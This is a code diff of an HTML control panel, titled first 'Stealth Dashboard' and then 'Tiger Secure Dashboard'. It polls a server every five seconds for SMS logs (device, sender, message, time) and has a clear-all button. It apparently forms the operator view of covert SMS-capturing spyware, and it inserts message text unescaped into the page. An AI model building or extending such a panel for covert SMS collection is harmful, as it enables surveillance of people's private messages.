@@ -2,47 +2,91 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Tiger - Stealth Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tiger Secure Dashboard</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
-        h2 { color: #ff4d4d; border-bottom: 2px solid #333; padding-bottom: 10px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #262626; border-radius: 8px; overflow: hidden; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
-        th { background: #333; color: #ff4d4d; }
-        tr:hover { background: #3d3d3d; }
-        .badge { background: #ff4d4d; padding: 2px 8px; border-radius: 4px; font-size: 12px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #fff; margin: 0; padding: 20px; }
+        .container { max-width: 1000px; margin: auto; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ff4500; padding-bottom: 10px; margin-bottom: 20px; }
+        .status-badge { background: #28a745; padding: 5px 10px; border-radius: 5px; font-size: 0.8em; }
+        table { width: 100%; border-collapse: collapse; background: #2d2d2d; border-radius: 8px; overflow: hidden; }
+        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #444; }
+        th { background-color: #ff4500; color: white; text-transform: uppercase; font-size: 0.9em; }
+        tr:hover { background-color: #3d3d3d; }
+        .btn-clear { background: #dc3545; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; transition: 0.3s; }
+        .btn-clear:hover { background: #a71d2a; }
+        .no-data { text-align: center; padding: 40px; color: #888; }
     </style>
 </head>
 <body>
-    <h2>🐯 Tiger Control Panel</h2>
-    <table>
-        <thead>
-            <tr>
-                <th>Device</th>
-                <th>Sender</th>
-                <th>Message</th>
-                <th>Time</th>
-            </tr>
-        </thead>
-        <tbody id="logTable">
-            </tbody>
-    </table>
+    <div class="container">
+        <div class="header">
+            <h1>🐅 TIGER <span style="color: #ff4500;">LIVE LOGS</span></h1>
+            <div>
+                <span class="status-badge" id="sync-status">Connected</span>
+                <button class="btn-clear" onclick="clearLogs()">Clear All Logs</button>
+            </div>
+        </div>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Device</th>
+                    <th>Sender</th>
+                    <th>Message</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody id="log-table-body">
+                </tbody>
+        </table>
+        <div id="no-data-msg" class="no-data" style="display: none;">No SMS logs found yet...</div>
+    </div>
 
     <script>
+        // Data fetch karne ka function
         async function fetchLogs() {
-            const response = await fetch('/get-logs');
-            const logs = await response.json();
-            const tableBody = document.getElementById('logTable');
-            tableBody.innerHTML = logs.map(log => `
-                <tr>
-                    <td><span class="badge">${log.device}</span></td>
-                    <td><b>${log.sender}</b></td>
-                    <td>${log.message}</td>
-                    <td>${new Date(log.timestamp).toLocaleString()}</td>
-                </tr>
-            `).join('');
+            try {
+                const response = await fetch('/get-logs');
+                const logs = await response.json();
+                const tableBody = document.getElementById('log-table-body');
+                const noDataMsg = document.getElementById('no-data-msg');
+
+                if (logs.length === 0) {
+                    tableBody.innerHTML = '';
+                    noDataMsg.style.display = 'block';
+                    return;
+                }
+
+                noDataMsg.style.display = 'none';
+                tableBody.innerHTML = logs.map(log => `
+                    <tr>
+                        <td style="color: #ff4500; font-weight: bold;">${log.device}</td>
+                        <td>${log.sender}</td>
+                        <td>${log.message}</td>
+                        <td style="font-size: 0.85em; color: #aaa;">${log.time}</td>
+                    </tr>
+                `).join('');
+                
+                document.getElementById('sync-status').innerText = 'Last Sync: ' + new Date().toLocaleTimeString();
+            } catch (error) {
+                console.error('Fetch Error:', error);
+                document.getElementById('sync-status').innerText = 'Sync Error!';
+                document.getElementById('sync-status').style.background = '#dc3545';
+            }
         }
-        setInterval(fetchLogs, 5000); // Har 5 second mein update karega
+
+        // Logs clear karne ka function
+        async function clearLogs() {
+            if (confirm('Kya aap saare logs delete karna chahte hain?')) {
+                await fetch('/clear-logs', { method: 'POST' });
+                fetchLogs();
+            }
+        }
+
+        // Har 5 second mein auto-refresh
+        setInterval(fetchLogs, 5000);
+        // Pehli baar load hone par
         fetchLogs();
     </script>
 </body>
